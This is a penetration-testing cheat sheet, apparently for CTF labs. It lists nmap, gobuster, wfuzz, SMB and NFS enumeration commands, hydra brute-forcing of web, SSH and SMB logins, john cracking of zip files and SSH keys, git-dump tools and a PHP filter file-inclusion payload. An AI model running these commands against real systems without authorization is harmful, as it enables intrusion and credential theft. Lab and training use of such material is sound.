# Resources

* GTFOBins - https://gtfobins.github.io/
* Payloads All The Things - https://github.com/swisskyrepo/PayloadsAllTheThings


## Enumerations 

### Basic Scan

* Agressive scan - Will perform OS detection and version detection
    * `nmap -A -oN nmap.txt target`
* Run vulnerabilities scripts
    * `nmap -script vuln -oN nmapVuln.txt target`
* Scann all the ports
    * `nmap -A -p- -oN nmapFull.txt target`

### Enumerate Web Site Folders

* `gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt`
* `gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  | tee gobuster2.txt`
* `gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee gobuster3.txt`
* `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 54 -t10 "target.thm/FUZZ"`

### Find SubDomains
* `wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 290 -H "Host:FUZZ.somedomain.com" "http://somedomain.com/"`

### Enumerate SMB
* `enum4linux -a target | tee enum4linux.txt`
* `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmapSamba.txt target`
* `smbmap -H target`
* `smbclient -U guest \\\\target\\IPC$`

### Enumerate Mounts
* `nmap -p PORT --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmapRpc.txt target`
    * To mount: `sudo mount -t nfs target:$SOURCE_PATH $DESTINATION_PATH`
* `showmount -e target`

### Enumerate Wordpress Site
* Get users: `wpscan --url http://target/ -e vp,u`
* Get Plugins `$ nmap -sV --script http-wordpress-enum --script-args search-limit=10000 -p 80 target `
	* https://nmap.org/nsedoc/scripts/http-wordpress-enum.html

### Web Site Scan

* nikto: `nikto -h http://target/`


## Brute Forcing

### Brute Force Web Site Password
* `hydra -l SomeUser -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect' IP http-post-form`
* Basic auth: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -e snr -u -t64 10.10.174.130 http-head`
* Combine wordlists: `/usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist.txt`

#### Wordpress
* `hydra -l wade -P /usr/share/wordlists/rockyou.txt -u -f -t64 -m '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:S=Location' http://target/ http-post-form -v -e snr`
* `wpscan --url http://target/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50`

### SSH
* `hydra -l root -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t32 target ssh`

### SMB
`hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -e snr target smb`

### Brute Force Zip File
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip 

### Break ssh Key Password
```sh
python ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
```

## Run A Python Web Server
sudo python3 -m http.server 80

## SSH Tunnel
ssh -L LOCALPORT:localhost:REMOTEPORT user@domain.com

## Dump Git From Web Site
https://github.com/internetwache/GitTools

```sh
git clone http://pwd.harder.local/.git/
./GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ gitFolder
./GitTools/Extractor/extractor.sh gitFolder/ gitExtracted
```

## File Inclusion

* Read a PHP file in base64 when include/require is used:
	* ?param=php://filter/convert.base64-encode/resource=FILE